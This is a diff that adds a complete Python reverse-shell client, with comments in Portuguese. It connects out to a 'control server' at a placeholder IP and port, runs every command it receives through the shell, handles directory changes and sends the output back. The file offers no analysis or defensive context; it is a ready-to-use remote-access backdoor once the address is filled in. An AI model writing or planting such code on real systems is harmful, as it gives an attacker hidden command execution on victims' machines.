@@ -1,0 +1,40 @@
+import socket
+import subprocess
+import os
+
+# Configurações da conexão
+IP = "SERVER IP"  # IP do servidor de controle
+PORT = PORT             # Porta do servidor de controle
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, PORT))
+    
+    while True:
+        command = s.recv(1024).decode()
+        
+        if command.lower() == "exit":
+            break
+        
+        if command[:2] == "cd":
+            try:
+                os.chdir(command[3:])
+                s.send(b"Directory changed.\n")
+            except Exception as e:
+                s.send(str(e).encode())
+            continue
+        
+        try:
+            output = subprocess.check_output(command, shell=True)
+        except Exception as e:
+            output = str(e).encode()
+        
+        if not output:
+            output = b"No output.\n"
+        
+        s.send(output)
+    
+    s.close()
+
+if __name__ == "__main__":
+    connect()
